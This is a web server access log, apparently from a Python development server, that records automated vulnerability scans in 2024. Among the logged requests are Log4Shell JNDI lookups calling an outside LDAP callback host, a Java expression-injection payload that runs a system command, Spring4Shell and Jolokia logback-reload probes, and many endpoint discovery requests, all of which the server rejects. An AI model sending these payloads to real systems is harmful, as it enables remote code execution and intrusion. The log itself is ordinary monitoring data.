2024-08-29 08:03:58,188.188 INFO [Thread-156 (process_request_thread)] [_internal.py:97] - 10.185.16.44 - - [29/Aug/2024 08:03:58] "[33mGET / HTTP/1.1[0m" 404 -
2024-08-29 08:03:58,202.202 INFO [Thread-157 (process_request_thread)] [_internal.py:97] - 10.185.16.44 - - [29/Aug/2024 08:03:58] "[33mGET / HTTP/1.1[0m" 404 -
2024-08-29 08:03:58,216.216 INFO [Thread-158 (process_request_thread)] [_internal.py:97] - 10.185.16.44 - - [29/Aug/2024 08:03:58] "[33mGET /${jndi:ldap://cn.oast-cn.byted-dast.com/realtime/active-scan-cn/deserialization/log4j2/1wktavnhz00whbwg} HTTP/1.1[0m" 404 -
2024-08-29 08:03:58,230.230 INFO [Thread-159 (process_request_thread)] [_internal.py:97] - 10.185.16.44 - - [29/Aug/2024 08:03:58] "[33mGET /?${jndi:ldap://cn.oast-cn.byted-dast.com/realtime/active-scan-cn/deserialization/log4j2/1wktavnhz00whbwg} HTTP/1.1[0m" 404 -
2024-08-29 08:03:58,244.244 INFO [Thread-160 (process_request_thread)] [_internal.py:97] - 10.185.16.44 - - [29/Aug/2024 08:03:58] "[33mPOST / HTTP/1.1[0m" 404 -
2024-08-29 08:03:58,258.258 INFO [Thread-161 (process_request_thread)] [_internal.py:97] - 10.185.16.44 - - [29/Aug/2024 08:03:58] "[33mPUT / HTTP/1.1[0m" 404 -
2024-08-29 08:04:01,458.458 INFO [Thread-162 (process_request_thread)] [_internal.py:97] - 10.185.16.44 - - [29/Aug/2024 08:04:01] "[33mGET /actuator/jolokia/list/ HTTP/1.1[0m" 404 -
2024-08-29 08:04:01,478.478 INFO [Thread-163 (process_request_thread)] [_internal.py:97] - 10.185.16.44 - - [29/Aug/2024 08:04:01] "[33mGET /jolokia/list/ HTTP/1.1[0m" 404 -
2024-08-29 08:04:01,606.606 ERROR [Thread-164 (process_request_thread)] [_internal.py:97] - 10.185.16.44 - - [29/Aug/2024 08:04:01] code 400, message Bad request version ("\x14|~\x08ì-I\x03\x80´\x19\x01G8Õ¸½üD\x03wúe©\x00V\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00\x9f\x00\x9eÌªÀ¯À\xadÀ®À¬À$À(À#À'À")
2024-08-29 08:04:01,606.606 INFO [Thread-164 (process_request_thread)] [_internal.py:97] - 10.185.16.44 - - [29/Aug/2024 08:04:01] "[31m[1m\x16\x03\x01\x01G\x01\x00\x01C\x03\x03Ò\x87,\x00?ö\x1c5á\x10|hÈåôTna\x8dÌº\x8dB1\x96z\x18\x16\x09M\x0eÇ <®Úë\x94(Q\x0b\x14|~\x08ì-I\x03\x80´\x19\x01G8Õ¸½üD\x03wúe©\x00V\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00\x9f\x00\x9eÌªÀ¯À­À®À¬À$À(À#À'À[0m" 400 -
2024-08-29 08:04:01,732.732 INFO [Thread-165 (process_request_thread)] [_internal.py:97] - 10.185.16.44 - - [29/Aug/2024 08:04:01] "[33mGET /v1/agent/self HTTP/1.1[0m" 404 -
2024-08-29 08:04:01,807.807 INFO [Thread-166 (process_request_thread)] [_internal.py:97] - 10.185.16.44 - - [29/Aug/2024 08:04:01] "[33mGET / HTTP/1.1[0m" 404 -
2024-08-29 08:04:01,825.825 INFO [Thread-167 (process_request_thread)] [_internal.py:97] - 10.185.16.44 - - [29/Aug/2024 08:04:01] "[33mGET /h2-console HTTP/1.1[0m" 404 -
2024-08-29 08:04:02,652.652 INFO [Thread-168 (process_request_thread)] [_internal.py:97] - 10.185.16.44 - - [29/Aug/2024 08:04:02] "[33mGET /__${new%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x HTTP/1.1[0m" 404 -
2024-08-29 08:04:03,267.267 INFO [Thread-169 (process_request_thread)] [_internal.py:97] - 10.185.16.44 - - [29/Aug/2024 08:04:03] "[33mGET /?class.module.classLoader[0]=test HTTP/1.1[0m" 404 -
2024-08-29 08:04:03,336.336 INFO [Thread-170 (process_request_thread)] [_internal.py:97] - 10.185.16.44 - - [29/Aug/2024 08:04:03] "[33mGET / HTTP/1.1[0m" 404 -
2024-08-29 08:04:03,353.353 INFO [Thread-171 (process_request_thread)] [_internal.py:97] - 10.185.16.44 - - [29/Aug/2024 08:04:03] "[33mGET /h2-console HTTP/1.1[0m" 404 -
2024-08-29 08:04:03,597.597 INFO [Thread-172 (process_request_thread)] [_internal.py:97] - 10.185.16.44 - - [29/Aug/2024 08:04:03] "[31m[1mGET /console HTTP/1.1[0m" 400 -
2024-08-29 08:04:04,052.052 INFO [Thread-173 (process_request_thread)] [_internal.py:97] - 10.185.16.44 - - [29/Aug/2024 08:04:04] "[33mGET /jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/127.0.0.1:22222!/logback.xml HTTP/1.1[0m" 404 -
2024-09-04 11:16:28,372.372 ERROR [Thread-174 (process_request_thread)] [_internal.py:97] - 10.185.44.131 - - [04/Sep/2024 11:16:28] code 400, message Bad request version ('\x00{\x000\x000\x000\x000\x00A\x00A\x000\x000\x00-\x000\x00A\x000\x000\x00-\x000\x000\x00a\x000\x00-\x00A\x00A\x000\x00A\x00-\x000\x000\x000\x000\x00A\x000\x00A\x00A\x000\x00A\x00A\x000\x00}\x00\x00\x00àmß_')
2024-09-04 11:16:28,372.372 INFO [Thread-174 (process_request_thread)] [_internal.py:97] - 10.185.44.131 - - [04/Sep/2024 11:16:28] "[31m[1m\x01\x00\x00ýÎú\x0b° \x00\x00\x00MMS\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00\x01\x00\x03\x00ðððð\x0b\x00\x04\x00\x1c\x00\x03\x00N\x00S\x00P\x00l\x00a\x00y\x00e\x00r\x00/\x009\x00.\x000\x00.\x000\x00.\x002\x009\x008\x000\x00;\x00 \x00{\x000\x000\x000\x000\x00A\x00A\x000\x000\x00-\x000\x00A\x000\x000\x00-\x000\x000\x00a\x000\x00-\x00A\x00A\x000\x00A\x00-\x000\x000\x000\x000\x00A\x000\x00A\x00A\x000\x00A\x00A\x000\x00}\x00\x00\x00àmß_[0m" 400 -
2024-09-04 11:16:33,381.381 ERROR [Thread-175 (process_request_thread)] [_internal.py:97] - 10.185.44.131 - - [04/Sep/2024 11:16:33] code 400, message Bad request version ('GetClassName\x00\x00\x00\x02\x04\x00\x00\x00\x00\x01\x00')
2024-09-04 11:16:33,381.381 INFO [Thread-175 (process_request_thread)] [_internal.py:97] - 10.185.44.131 - - [04/Sep/2024 11:16:33] "[31m[1m\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x0cGetClassName\x00\x00\x00\x02\x04\x00\x00\x00\x00\x01\x00[0m" 400 -
2024-09-04 11:16:33,396.396 INFO [Thread-177 (process_request_thread)] [_internal.py:97] - 10.185.44.131 - - [04/Sep/2024 11:16:33] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-04 11:20:00,948.948 INFO [Thread-178 (process_request_thread)] [_internal.py:97] - 10.185.44.131 - - [04/Sep/2024 11:20:00] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-04 11:20:23,647.647 INFO [Thread-179 (process_request_thread)] [_internal.py:97] - 10.185.28.19 - - [04/Sep/2024 11:20:23] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-04 11:20:23,664.664 INFO [Thread-180 (process_request_thread)] [_internal.py:97] - 10.185.28.19 - - [04/Sep/2024 11:20:23] "[33mGET /MFlfeALh HTTP/1.1[0m" 404 -
2024-09-04 11:20:23,704.704 INFO [Thread-181 (process_request_thread)] [_internal.py:97] - 10.185.28.19 - - [04/Sep/2024 11:20:23] "[33mGET /clickhouse/data/query HTTP/1.1[0m" 404 -
2024-09-04 11:20:23,722.722 INFO [Thread-182 (process_request_thread)] [_internal.py:97] - 10.185.28.19 - - [04/Sep/2024 11:20:23] "[33mGET /zabbix HTTP/1.1[0m" 404 -
2024-09-04 11:20:23,740.740 INFO [Thread-183 (process_request_thread)] [_internal.py:97] - 10.185.28.19 - - [04/Sep/2024 11:20:23] "[33mGET /png/ HTTP/1.1[0m" 404 -
2024-09-04 11:20:23,860.860 INFO [Thread-184 (process_request_thread)] [_internal.py:97] - 10.185.28.19 - - [04/Sep/2024 11:20:23] "[33mGET /docs HTTP/1.1[0m" 404 -
2024-09-04 11:20:24,079.079 INFO [Thread-185 (process_request_thread)] [_internal.py:97] - 10.185.28.19 - - [04/Sep/2024 11:20:24] "[33mGET /k3cloud/ HTTP/1.1[0m" 404 -
2024-09-04 11:20:24,298.298 INFO [Thread-186 (process_request_thread)] [_internal.py:97] - 10.185.28.19 - - [04/Sep/2024 11:20:24] "[33mGET /dsview/protected/login.do HTTP/1.1[0m" 404 -
2024-09-04 11:20:24,517.517 INFO [Thread-187 (process_request_thread)] [_internal.py:97] - 10.185.28.19 - - [04/Sep/2024 11:20:24] "[33mGET /swagger/swagger-ui.html HTTP/1.1[0m" 404 -
2024-09-04 11:20:24,743.743 INFO [Thread-188 (process_request_thread)] [_internal.py:97] - 10.185.28.19 - - [04/Sep/2024 11:20:24] "[33mGET /api-docs/ HTTP/1.1[0m" 404 -
2024-09-04 11:20:24,863.863 INFO [Thread-189 (process_request_thread)] [_internal.py:97] - 10.185.28.19 - - [04/Sep/2024 11:20:24] "[33mGET /cas HTTP/1.1[0m" 404 -
2024-09-04 11:20:25,082.082 INFO [Thread-190 (process_request_thread)] [_internal.py:97] - 10.185.28.19 - - [04/Sep/2024 11:20:25] "[33mGET /swagger/index.html HTTP/1.1[0m" 404 -
2024-09-04 11:20:25,300.300 INFO [Thread-191 (process_request_thread)] [_internal.py:97] - 10.185.28.19 - - [04/Sep/2024 11:20:25] "[33mGET /swagger.yaml HTTP/1.1[0m" 404 -
2024-09-04 11:20:25,518.518 INFO [Thread-192 (process_request_thread)] [_internal.py:97] - 10.185.28.19 - - [04/Sep/2024 11:20:25] "[33mGET /ui/ HTTP/1.1[0m" 404 -
2024-09-04 11:20:25,737.737 INFO [Thread-193 (process_request_thread)] [_internal.py:97] - 10.185.28.19 - - [04/Sep/2024 11:20:25] "[33mGET /healthz HTTP/1.1[0m" 404 -
2024-09-04 11:20:25,855.855 INFO [Thread-194 (process_request_thread)] [_internal.py:97] - 10.185.28.19 - - [04/Sep/2024 11:20:25] "[33mGET /swagger/ HTTP/1.1[0m" 404 -
